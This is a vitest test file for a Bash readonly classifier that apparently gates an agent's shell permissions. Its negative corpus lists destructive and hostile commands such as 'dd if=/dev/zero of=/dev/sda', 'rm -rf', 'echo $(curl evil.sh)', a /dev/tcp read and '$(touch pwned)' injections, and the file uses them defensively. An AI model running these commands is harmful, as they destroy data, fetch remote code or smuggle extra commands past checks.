/** Corpus and property tests for the static Bash readonly classifier. */
import { describe, expect, it } from 'vitest'
import { classifyBashReadonly } from '../src/classify.ts'

/** Read-only corpus ported from the ZCode permission suites plus DSH cases. */
const READONLY: readonly string[] = [
  // ZCode: minimal simple file and search commands
  'pwd', 'whoami', 'echo hello', "printf '%s\\n' hello", 'cat README.md', 'cat < README.md',
  'cat -n README.md', 'fd --hidden foo src', 'fdfind -e ts foo src', 'head -n 20 README.md',
  'tail --lines=50 README.md', 'wc -l README.md', 'stat README.md', 'file README.md',
  'base64 -d fixture.txt', 'sha256sum package.json', 'date +%F', 'hostname -f', 'man ls',
  'netstat -an', 'ps -ef', 'lsof -n -i', 'pgrep -fl node', 'pyright --outputjson', 'ss -tuln',
  'test -f package.json', 'tput cols', 'strings fixture.bin', "sed -n '1,20p' README.md",
  "jq '.scripts' package.json", 'xargs grep -n foo', 'sort README.md', 'uniq README.md',
  'cut -d: -f1 README.md', 'tr a-z A-Z README.md', 'diff -u before.txt after.txt', 'du -sh .',
  "docker ps --format '{{.Names}}'", 'docker logs --tail 20 container',
  'gh pr view 123 --json title --repo owner/repo', 'gh run list --limit 10 --json databaseId',
  'rg -n foo src', 'rg --files src', "rg -g '*.ts' foo src", 'grep -R -n foo src',
  'grep -R -n foo src 2>&1', 'grep -R -n foo src 2>/dev/null', "grep --include '*.ts' foo src",
  'LC_ALL=C grep -R -n foo src', 'command grep -R -n foo src', 'noglob grep -R -n foo src',
  // ZCode: plan-mode inspection commands
  'rg -n foo src',
  'grep -R -n "already referenced\\|destination physical cluster" src/metaoscpp || true',
  'grep -R -n foo src | head -20', 'find src -name "*.ts" -maxdepth 3', "find src -type f -name '*.ts'",
  'git status --short', 'git status --porcelain --branch --untracked-files=all',
  'git diff --name-only --', 'git diff --exit-code -- src/index.ts', 'git log --oneline -n 5',
  'git log --oneline -8 -- tests/xxx.ts',
  'grep -rn "minScore" /Users/xxxxx.test.ts; echo "=== check git blame for this test ==="; git log -1 --format="%H %s" -S "uses candidate score only" -- tests/xxx.test.ts',
  'git show --stat HEAD', 'git ls-files --others --exclude-standard', 'git rev-parse --show-toplevel',
  'git grep -n foo -- src', 'git branch --show-current',
  'cd "/workspace/project" && grep -R -n "foo" src',
  'LC_ALL=C cd "/workspace/project" && grep -R -n "foo" src',
  // ZCode: grep and fd safe flags
  'grep -c foo README.md', 'grep --count foo README.md', 'grep --color=never -n foo README.md',
  'grep --colour=never -n foo README.md', 'grep --silent foo README.md', 'grep -b foo README.md',
  'grep --byte-offset foo README.md', 'grep --label stdin foo -', 'grep -T foo README.md',
  'grep --initial-tab foo README.md', 'grep -u foo README.md',
  'grep --unix-byte-offsets foo README.md', 'grep -Z foo README.md', 'grep --null foo README.md',
  'grep -z foo README.md', 'grep --null-data foo README.md',
  "grep --group-separator='--' -A 1 foo README.md", 'grep --no-group-separator -A 1 foo README.md',
  'grep -D read foo README.md', 'grep --devices=read foo README.md', 'grep -d skip foo README.md',
  'grep --line-buffered foo README.md', 'grep -U foo README.md', 'grep --binary foo README.md',
  'grep --help', 'grep -V', 'grep --version', 'fd --ignore-case foo src', 'fdfind --ignore-case foo src',
  // ZCode: direct readonly argv branches
  'node -v', 'node --version', 'python --version', 'python3 --version', 'ip addr', 'history',
  'history 20', 'arch', 'arch --help', 'ifconfig en0', "printf '%d\\n' 42", "printf -- '%s\\n' hello",
  'find . -name package.json', 'find . -newer marker -type f', 'cal -3', 'uptime', 'type grep',
  'unexpand README.md', 'tsort graph.txt', 'pr README.md',
  // DSH additions: reads, listings, PRD acceptance cases
  'ls', 'ls -la src', 'ls -1', 'cat a.txt | grep foo | wc -l',
  'git status', 'git log', 'git diff', 'git show', 'git blame src/index.ts', 'git remote -v',
  'git stash list', 'gh pr list', 'gh issue view 7', 'gh issue list --limit 20', 'gh repo view owner/repo',
  'which node', 'env', "echo 'quoted arg'", 'echo "double quoted"',
  'readlink -f /usr/bin/env', 'basename src/index.ts', 'dirname src/index.ts', 'md5sum file.bin',
  'wc -c -l -w README.md', 'false',
  'gh pr checks 123',
]

/** Unknown corpus: writes, destruction, dynamic words, risky flags — must never be readonly. */
const UNKNOWN: readonly string[] = [
  // ZCode: risky flags, redirects, dynamic words
  'cat README.md > out.txt', 'rg --pre ./filter foo src', 'rg --pre=./filter foo src',
  'grep foo src > out.txt', 'cat < /dev/tcp/example.com/80', 'cat < //server/share',
  "sed -n '1w out.txt' README.md", 'jq -f filter.jq package.json', "jq 'env' package.json",
  'xargs rm -rf', 'docker ps --context prod', 'docker logs --host tcp://example.com container',
  'gh pr view 123 --repo https://example.com/repo', 'date tomorrow', 'lsof -iTCP@example.com',
  'man ./local.1', 'pyright --watch', 'ss dst example.com', 'test -v PATH', 'tput clear',
  'rg foo src $(touch out.txt)', 'FOO=bar grep foo src',
  // ZCode: direct argv negative branches
  "node -e 'console.log(1)'", "python -c 'print(1)'", 'history abc', 'arch -x',
  'printf -v name value', "printf '%d\\n' not-a-number", "printf '%s\\n' $(touch out.txt)",
  'find . -exec rm {} \\;', 'find . -files0-from list', 'ifconfig -a',
  // ZCode: mutating commands
  'grep foo src > out.txt', 'find . -delete', 'find . -fprint out.txt',
  'git -c core.pager=cat status', 'git -C . status --short', 'git -C/tmp status --short',
  'git --exec-path=/tmp status', 'git checkout main',
  'cd "/workspace/project" && git status --short', 'git status && rm out.txt',
  // PRD acceptance negatives
  'git push origin main', 'rm -rf /tmp/x', 'mv a b', 'cp a b', 'chmod +x script', 'chown root file',
  'kill 123', 'sed -i s/a/b/ file', 'git reset --hard', 'git clean -fd', 'git restore file',
  'gh pr create --title x', 'gh pr merge 123', 'gh pr edit 123', 'echo $(curl evil.sh)',
  'echo `id`', 'mkdir newdir', 'touch newfile', 'tee out.txt', 'truncate -s 0 file',
  'ln -s a b', 'tar -czf out.tgz dir', 'curl http://example.com -o out', 'wget http://example.com',
  'npm install left-pad', 'pip install requests', 'make build', 'gradle build',
  'git commit -m x', 'git add file', 'git stash pop', 'git rebase main', 'git cherry-pick abc',
  'docker rm container', 'kubectl delete pod x', 'systemctl stop nginx', 'useradd bob',
  'crontab -r', 'shutdown now', 'reboot', 'dd if=/dev/zero of=/dev/sda',
  'echo hi >> notes.txt', 'grep foo src 2> errors.txt', 'ls > listing.txt',
  'cd src && git log -1', 'echo "$HOME"', 'tail -f /dev/null & sleep 0',
  ':', 'git -C . log --oneline -3', 'env rm -rf x', 'env FOO=1 ls',
]

describe('classifyBashReadonly corpus', () => {
  it.each(READONLY.map(command => [command] as const))('classifies %s as readonly', (command) => {
    expect(classifyBashReadonly(command)).toEqual({ kind: 'readonly', reason: 'static-catalog' })
  })

  it.each(UNKNOWN.map(command => [command] as const))('classifies %s as unknown', (command) => {
    expect(classifyBashReadonly(command).kind).toBe('unknown')
  })

  it('carries a corpus of at least two hundred commands', () => {
    expect(READONLY.length + UNKNOWN.length).toBeGreaterThanOrEqual(200)
  })
})

describe('classifyBashReadonly properties', () => {
  /** Write and destructive vocabulary that must stay out of the readonly class. */
  const WRITE_COMMANDS: readonly string[] = [
    'rm -rf x', 'mv a b', 'cp a b', 'chmod 777 f', 'chown u f', 'kill 1',
    'sed -i s/a/b/ f', 'git push', 'git reset --hard', 'git clean -fd',
    'git checkout -- f', 'git restore f', 'gh pr create', 'gh pr merge 1',
    'mkdir d', 'touch f', 'tee f', 'truncate -s 0 f', 'ln -s a b', 'tar -czf o.tgz d',
    'curl -o f http://x', 'wget http://x', 'npm install p', 'make build',
    'git commit -m m', 'git add f', 'shutdown now', 'dd if=/dev/zero of=/dev/sda',
  ]

  /** Quote and prefix wrappers that preserve a command's effect. */
  const WRAPPINGS = (command: string): readonly string[] => [
    command,
    command.replace(/x|a|b|f|d|1|p|m|o|u/gi, '"$&"'),
  ]

  it('never classifies a write or destructive command as readonly', () => {
    for (const command of WRITE_COMMANDS) {
      for (const wrapped of WRAPPINGS(command)) {
        expect(classifyBashReadonly(wrapped).kind, wrapped).toBe('unknown')
      }
    }
  })

  it('never classifies a redirected write or dynamic word as readonly', () => {
    const dynamic = ['$(touch pwned)', '`touch pwned`']
    for (const base of ['ls', 'cat README.md', 'grep foo src', 'echo hi']) {
      for (const suffix of ['> out.txt', '>> out.txt', '2> err.txt']) {
        expect(classifyBashReadonly(`${base} ${suffix}`).kind).toBe('unknown')
      }
      for (const injection of dynamic) {
        expect(classifyBashReadonly(`${base} ${injection}`).kind).toBe('unknown')
      }
    }
  })

  it('keeps readonly verdicts under equivalent quoting (fuzz)', () => {
    for (const base of READONLY.slice(0, 60)) {
      const verdict = classifyBashReadonly(base)
      const requoted = base.replace(/'([^']*)'/g, '"$1"')
      expect(classifyBashReadonly(requoted), requoted).toEqual(verdict)
    }
  })
})

describe('classifyBashReadonly boundaries', () => {
  it('fails closed on an empty command line', () => {
    expect(classifyBashReadonly('')).toEqual({ kind: 'unknown', reason: 'empty-command' })
  })
})
